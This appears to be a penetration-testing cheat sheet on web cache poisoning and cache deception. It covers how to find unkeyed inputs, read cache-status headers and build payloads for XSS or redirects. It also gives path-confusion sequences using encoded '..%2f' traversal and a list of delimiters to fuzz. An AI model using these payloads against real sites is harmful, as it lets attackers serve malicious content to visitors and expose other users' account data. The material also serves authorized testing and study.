[#](#) Web Cache Poisoning

Get the cached key

    Pragma: x-get-cache-key
 
1. Find a point of injection that is reflected in the response (get param, header, cookie)
2. Confirm that this "point of injection" is not part of the cached keys.
4. Create a payload (xss, redirect, etc...)
    - string from a GET params or cookie (-> escape the string and XSS)
    - host from x-headers-type (-> redirect to exploit server)

### Detecting Cache Response:

* X-Cache
    * X-Cache: miss -> missed the cache (request sent to web server directly)
    * X-Cache: hit  -> hit the cached (not the web server)
    * X-Cache: dynamic -> origin server dynamically generated the content. Generally this means the response is not suitable for caching
    * X-Cache: refresh -> content was outadated

* Cache-Control:
    * Cache-Control: public -> suggests that the resource is cacheable, but cache might overide this header

* Response time might also indicate caching

### Param Miner:

- Guess query params: some query params are excluded from cached key
- Guess everything!

### Payloads Cache Poisoning (OPTIONS, HEAD, GET)

* Pragma: x-get-cache-key
* /?cb=AAAA&utm_content=BBBBB
* /js/geolocate.js?callback=setCountryCookie&utm_content=foo;callback=arbitraryFunction

### Payloads Cache Deception (OPTIONS, HEAD, GET)

1. /profile
2. /profileAAAA
3. /profile;AAAA
4. /profile;AAAA.css
5. X-Cache: miss

1. /AAAA/..%2fmy-account
2. Find folder that are cached (/resources, /assets, /static)
3. /resources/..%2fmy-account
4. X-Cache: miss

1. /my-account%23AAAA
2. /AAAA/..%2fmy-account
3. Find folder that are cached (/resources, /assets, /static)
4. /AAAA/..%2fresources/labs.css
5. 404 Cache: Miss
6. /resources/..%2fLabs.css
7. 404 (no cache -> cache decode ..%2f)
8. /my-account%23%2f%2e%2e%2fresources (%23 is used for delimiter)

Web Cache Delimiter List: 

`(turn off intruder encoding)`

`(browsers URL-encode characters like {, }, <, and >, and use # to truncate the path. If the cache or origin server decodes these characters)`


```
!
"
#
$
%
&
'
(
)
*
+
,
-
.
/
:
;
<
=
>
?
@
[
\
]
^
_
`
{
|
}
~
%21
%22
%23
%24
%25
%26
%27
%28
%29
%2A
%2B
%2C
%2D
%2E
%2F
%3A
%3B
%3C
%3D
%3E
%3F
%40
%5B
%5C
%5D
%5E
%5F
%60
%7B
%7C
%7D
%7E
%00
%0A
%09
```
